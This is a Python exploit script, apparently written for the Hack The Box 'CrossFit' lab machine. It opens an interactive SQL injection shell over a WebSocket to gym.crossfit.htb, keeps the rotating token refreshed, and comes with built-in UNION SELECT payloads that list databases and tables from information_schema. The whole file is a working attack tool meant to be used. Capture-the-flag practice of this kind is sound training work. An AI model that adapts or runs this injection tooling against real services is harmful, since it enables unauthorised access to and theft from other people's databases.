#!/usr/bin/env python3

import json
import websocket
from cmd import Cmd

class Term(Cmd):
    prompt = "injection> "

    def __init__(self):
        self.connect()
        super().__init__()

    def connect(self):
        self.ws = websocket.create_connection("ws://gym.crossfit.htb/ws/")
        data = json.loads(self.ws.recv())
        self.token = data["token"]

    def send_ws(self, args):
        self.ws.send(
            f'{{"message":"available","params":"{args}", "token": "{self.token}"}}'
        )
        data = json.loads(self.ws.recv())
        self.token = data["token"]
        return data["debug"]

    def send(self, args):
        try:
            return self.send_ws(args)
        except (websocket._exceptions.WebSocketConnectionClosedException, BrokenPipeError):
            self.connect()
            return self.send_ws(args)

    def do_exit(self, args):
        return True

    def default(self, args):
        print(self.send(args))

    def do_dbs(self, args):
        response = self.send(f"999 union select group_concat(schema_name),2 from information_schema.schemata")
        print("\n".join(response.split(", ")[0].split()[1].split(',')))

    def do_tables(self, args):
        if len(args) == 0:
            print("[-] database name is required as argument. run dbs command to list databases.")
            return
        response = self.send(f"999 union select group_concat(table_name),2 from information_schema.tables where table_schema='{args}'")
        print("\n".join(response.split(", ")[0].split()[1].split(',')))


term = Term()
term.cmdloop()
